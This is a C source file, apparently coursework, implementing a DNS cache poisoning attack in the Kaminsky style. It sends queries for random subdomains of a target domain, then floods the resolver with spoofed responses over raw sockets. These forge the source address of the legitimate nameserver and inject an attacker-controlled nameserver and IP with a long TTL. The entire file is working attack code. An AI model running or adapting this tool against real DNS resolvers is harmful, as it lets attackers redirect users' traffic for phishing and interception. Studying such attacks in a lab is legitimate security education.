// apparently working here
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <getopt.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <stdbool.h>
#include <arpa/inet.h>

// #include "1605071_additional.h"

#define DNSSERV_BIND_PORT 53
#define DNSSERV_SRC_PORT 33333
#define DNSRESP_SIZE 1024
#define N_DUP_REQ 16
#define N_DUP_RESP 128
#define N_TRIES 64
#define MAX_DUP_REQ 1002
#define MAX_DUP_RESP 1002
#define RAND_LEN 5

#define IPHDR_LEN sizeof(struct iphdr)
#define UDPHDR_LEN sizeof(struct udphdr)

// DNS type
#define A 1
#define NS 2
// DNS class
#define IN 1

char input_filename[] = "input.txt";
FILE *fp;

char domain[1000];
char ip[1000];
char attacker_ns[1000];
char attacker_ip[1000];
char orig_ns[1000];
int ndupreq = N_DUP_REQ;
int ndupresp = N_DUP_RESP;
int ntries = N_TRIES;

int sockd[MAX_DUP_REQ]; // udp socket descriptors

// --------------------------------additinal
typedef struct
{
    uint8_t *p;
    size_t l;
} Packet;

struct dnshdr
{
    uint16_t id;  // query identification number
    uint16_t flags;
    uint16_t QDCOUNT;
    uint16_t ANCOUNT;
    uint16_t NSCOUNT;
    uint16_t ARCOUNT;
};

void printError(char *str)
{
    printf("-------------\n");
    printf("%s\n", str);
    perror("cError");
    printf("-------------\n");
}

uint16_t get_checksum(uint8_t buf[], size_t buflen)
{
    if (buflen <= 0)
        return 0;

    uint32_t sum = 0;

    int i = 0;
    while (i < buflen - 1)
    {
        sum = sum + *(uint16_t *)&buf[i]; // adding all half-words together hence increment by 2
        i = i + 2;
    }

    if (buflen & 1)
    {
        sum = sum + buf[buflen - 1]; // if last byte was missed, adding it
    }

    return ~((sum >> 16) + (sum & 0xffff));
}
// --------------------------------additinal

void get_DNS_header(Packet *P, uint16_t id, uint16_t flags, uint16_t qcnt, 
                    uint16_t anscnt, uint16_t nscnt, uint16_t addcnt);
uint8_t set_ques_record(Packet *P, uint16_t qclass, uint16_t qtype, const char *qname);
uint8_t set_resrc_record(Packet *P, uint16_t class, uint16_t type, char *rdata, uint8_t off);
int send_packet(Packet dnspkt, char *dest_ip, uint16_t dest_port);
int send_spoofed_packet(Packet dnspkt, char *src_ip, char *dest_ip, 
                        uint16_t src_port, uint16_t dest_port);
void send_dns_request(Packet D, char *rndsd);
void send_dns_response(Packet D, char *rndsd);


void getInput()
{
    // printf("in get input\n");
    fp = fopen(input_filename, "r");
    if (fp == NULL)
    {
        printf("Error while opening the file.\n");
        exit(EXIT_FAILURE);
    }

    fscanf(fp, "%s", ip);
    fscanf(fp, "%s", domain);
    fscanf(fp, "%s", orig_ns);
    fscanf(fp, "%s", attacker_ns);
    fscanf(fp, "%s", attacker_ip);
    fscanf(fp, "%d", &ndupreq);
    fscanf(fp, "%d", &ndupresp);
    fscanf(fp, "%d", &ntries);

    fclose(fp);
}

int main(int argc, char *argv[])
{
    srand(time(NULL)); // initialize PRG

    uint16_t RNDSD_LEN = 256;

    Packet D;
    D.p = NULL;
    D.l = 0;

    char rand_subdomain[RNDSD_LEN];

    getInput();

    if (ndupreq < 1 || ndupreq > MAX_DUP_REQ || ndupresp < 1 || ndupresp > MAX_DUP_RESP)
    {
        return -1;
    }

    char alphanum[] =
        //"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";
    
    int i;
    int cnt = 0;
    while (true)
    {
        cnt++;
        if (cnt > ntries)
            break;

        printf("Attacking attempt #%d\n", cnt);

        memset(rand_subdomain, 0, RNDSD_LEN);
        for (int i = 0; i < RAND_LEN; ++i)
        {
            rand_subdomain[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
        }

        rand_subdomain[RAND_LEN] = '.';
        strncat(rand_subdomain, domain, RNDSD_LEN - RAND_LEN - 1); // append the target domain

        printf("Generating random subdomain: %s\n", rand_subdomain);

        send_dns_request(D, rand_subdomain);

        send_dns_response(D, rand_subdomain);

        i = 0;
        while (true)
        {
            i++;
            if (i > ndupreq)
                break;

            close(sockd[i]);
        }
    }

    return 0;
}

void get_DNS_header(Packet *P, uint16_t id, uint16_t flags, uint16_t qcnt, uint16_t anscnt,
                    uint16_t nscnt, uint16_t addcnt)
{
    P->p = malloc(sizeof(struct dnshdr));
    P->l = sizeof(struct dnshdr);

    struct dnshdr *dnsh;

    dnsh = (struct dnshdr *)P->p;

    //hdr fields
    dnsh->id = htons(id); // uint16_t htons (uint16_t __hostshort)
    dnsh->flags = htons(flags);
    dnsh->QDCOUNT = htons(qcnt);
    dnsh->ANCOUNT = htons(anscnt);
    dnsh->NSCOUNT = htons(nscnt);
    dnsh->ARCOUNT = htons(addcnt);
}

uint8_t set_ques_record(Packet *P, uint16_t qclass, uint16_t qtype, const char *qname)
{
    size_t name_len = strlen(qname) + 2; // ques_name in dns name notation which is 2B bigger
    size_t qtype_len = 2;                // 2 means 2B
    size_t qclass_len = 2;
    P->p = realloc(P->p, P->l + name_len + qtype_len + qclass_len); //increasing pkt space to set the ques

    char *s1, *s2;
    s1 = malloc(strlen(qname) + 1); // get a copy of quesname
    s2 = s1;
    strcpy(s1, qname);

    uint8_t namoff = P->l;

    char *tok = strtok(s2, ".");
    while (tok != NULL)
    {
        sprintf(&P->p[P->l], "%c%s", (uint8_t)strlen(tok), tok); // prepend each token with its length
        P->l = P->l + strlen(tok) + 1;
        tok = strtok(NULL, ".");
    }

    P->p[P->l++] = '\0';
    free(s1);

    *(uint16_t *)&P->p[P->l] = htons(qtype);
    P->l = P->l + 2;
    *(uint16_t *)&P->p[P->l] = htons(qclass);
    P->l = P->l + 2;

    return namoff;
}

uint8_t set_resrc_record(Packet *P, uint16_t class, uint16_t type, char *rdata, uint8_t off)
{
    uint8_t namoff = -1;

    int typelen = 0;
    if (type == NS)
        typelen = strlen((rdata) + 2);
    else if (type == A)
        typelen = 4;

    P->p = realloc(P->p, P->l + 2 + 2 + 2 + 4 + 2 + typelen);

    *(uint16_t *)&P->p[P->l] = htons(0xc000 | off);
    P->l = P->l + 2;
    *(uint16_t *)&P->p[P->l] = htons(type);
    P->l = P->l + 2;
    *(uint16_t *)&P->p[P->l] = htons(class);
    P->l = P->l + 2;
    uint32_t BIG_TTL = 86400;
    *(uint32_t *)&P->p[P->l] = htonl(BIG_TTL); // uint32_t htonl (uint32_t __hostlong)
    P->l = P->l + 4;

    if (type == A)
    {
        *(uint16_t *)&P->p[P->l] = htons(4);
        P->l = P->l + 2;
        *(uint32_t *)&P->p[P->l] = inet_addr(rdata);
        P->l = P->l + 4;
    }
    else if (type == NS)
    {
        *(uint16_t *)&P->p[P->l] = htons(strlen(rdata) + 2);
        P->l = P->l + 2;

        char *s1, *s2;
        s1 = malloc(strlen(rdata) + 1);
        s2 = s1;
        strcpy(s1, rdata);

        namoff = P->l;

        char *tok = strtok(s2, ".");
        while (tok != NULL)
        {
            sprintf(&P->p[P->l], "%c%s", (uint8_t)strlen(tok), tok);
            P->l = P->l + strlen(tok) + 1;
            tok = strtok(NULL, ".");
        }

        P->p[P->l++] = '\0';
        free(s1);
    }

    return namoff;
}

int send_packet(Packet dnspkt, char *dest_ip, uint16_t dest_port)
{
    struct sockaddr_in trg_addr;

    trg_addr.sin_port = htons(dest_port);
    trg_addr.sin_addr.s_addr = inet_addr(dest_ip);
    static const char zeros[8] = {0, 0, 0, 0, 0, 0, 0, 0};
    memcpy(trg_addr.sin_zero, zeros, 8);
    trg_addr.sin_family = AF_INET;

    // socket: Create a new socket of type TYPE in domain DOMAIN using protocol PROTOCOL(3rd param).
    // If PROTOCOL is zero, one is chosen automatically.
    int socket_des = socket(AF_INET, SOCK_DGRAM, 0);

    // sendto: Send N bytes of BUF on socket FD to peer at address ADDR
    ssize_t ifsendto = sendto(socket_des, dnspkt.p, dnspkt.l, 0,
                              (struct sockaddr *)&trg_addr, sizeof(trg_addr));

    if (socket_des < 0)
    {
        printError("myError! Cannot create UDP socket");
        socket_des = -1;
    }
    else if (ifsendto < 0)
    {
        printError("myError! Cannot send UDP packet");
        close(socket_des);
        socket_des = -1;
    }

    return socket_des;
}

int send_spoofed_packet(Packet dnspkt, char *src_ip, char *dest_ip, uint16_t src_port, uint16_t dest_port)
{
    Packet pkt;
    pkt.p = malloc(IPHDR_LEN + UDPHDR_LEN + dnspkt.l);
    pkt.l = IPHDR_LEN + UDPHDR_LEN + dnspkt.l;

    struct sockaddr_in trg_addr;

    trg_addr.sin_port = 0;  // ignore
    trg_addr.sin_addr.s_addr = inet_addr(dest_ip);
    static const char zeros[8] = {0, 0, 0, 0, 0, 0, 0, 0};
    memcpy(trg_addr.sin_zero, zeros, 8);
    trg_addr.sin_family = AF_INET;  // IPv4

    struct iphdr *iph = (struct iphdr *)pkt.p;
    struct udphdr *udph = (struct udphdr *)(iph + 1);

    int retn = 0, on = 1;
    memset(pkt.p, 0, pkt.l);

    uint16_t pkt_len_minus_iphdr_len = pkt.l - IPHDR_LEN;
    iph->tot_len = htons(pkt_len_minus_iphdr_len);
    iph->protocol = IPPROTO_UDP;
    iph->saddr = inet_addr(src_ip);  // spoofed src_ip
    iph->daddr = inet_addr(dest_ip);

    udph->len = htons(pkt_len_minus_iphdr_len);
    udph->check = 0;   // initialize checksum
    udph->source = htons(src_port);
    udph->dest = htons(dest_port);


    memcpy(&pkt.p[IPHDR_LEN + UDPHDR_LEN], dnspkt.p, dnspkt.l);

    udph->check = get_checksum(pkt.p, pkt.l);

    iph->tos = 0;
    iph->tot_len = htons(pkt.l);
    uint16_t sm_id = rand();
    iph->id = htons(sm_id);
    iph->frag_off = 0;
    uint8_t temp_ttl = 64;
    iph->ttl = temp_ttl;
    iph->check = 0;
    size_t buflen = 20;
    iph->check = get_checksum(pkt.p, buflen);

    iph->version = 4;  // IPv4
    iph->ihl = 5;  // ip header length

    int sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    int if_setsocket = setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
    ssize_t if_sendto = sendto(sd, pkt.p, pkt.l, 0, (struct sockaddr *)&trg_addr, sizeof(trg_addr));

    if (sd < 0)
    {
        printError("myError! Cannot create raw socket");
        retn = -1;
    }
    else if (if_setsocket < 0)
    {
        printError("myError! Cannot set IP_HDRINCL");
        retn = -1;
    }
    else if (if_sendto < 0)
    {
        printError("myError! Cannot send spoofed packet");
        retn = -1;
    }

    free(pkt.p);
    close(sd);
    return retn;
}

void send_dns_request(Packet D, char *rndsd)
{
    printf("Sending %d duplicate requests\n", ndupreq);
    int i = 0;
    while (true)
    {
        i++;
        if (i > ndupreq)
            break;

        uint16_t p_id = rand() % 0xffff;
        uint16_t p_flags = 0x0100; // dns standard query
        uint16_t p_qcnt = 1;
        uint16_t p_anscnt = 0;
        uint16_t p_nscnt = 0;
        uint16_t p_addcnt = 0;
        get_DNS_header(&D, p_id, p_flags, p_qcnt, p_anscnt, p_nscnt, p_addcnt);
        set_ques_record(&D, IN, A, rndsd);
        sockd[i] = send_packet(D, ip, DNSSERV_BIND_PORT);
        free(D.p);
    }
}

void send_dns_response(Packet D, char *rndsd)
{
    printf("Flooding with %d spoofed responses\n", ndupresp);

    int i = 0;
    while (true)
    {
        i++;
        if (i > ndupresp)
            break;

        uint16_t p_id = rand() % 0xffff;
        uint16_t p_flags = 0x8400; // dns resp flags
        uint16_t p_qcnt = 1;
        uint16_t p_anscnt = 1;
        uint16_t p_nscnt = 1;
        uint16_t p_addcnt = 1;

        get_DNS_header(&D, p_id, p_flags, p_qcnt, p_anscnt, p_nscnt, p_addcnt);

        int off1 = set_ques_record(&D, IN, A, rndsd);
        set_resrc_record(&D, IN, A, attacker_ip, off1);
        
        uint8_t temp_off2 = off1 + RAND_LEN + 1;
        int off2 = set_resrc_record(&D, IN, NS, attacker_ns, temp_off2);
        set_resrc_record(&D, IN, A, attacker_ip, off2);

        send_spoofed_packet(D, orig_ns, ip, DNSSERV_BIND_PORT, DNSSERV_SRC_PORT);
        free(D.p);
    }
}
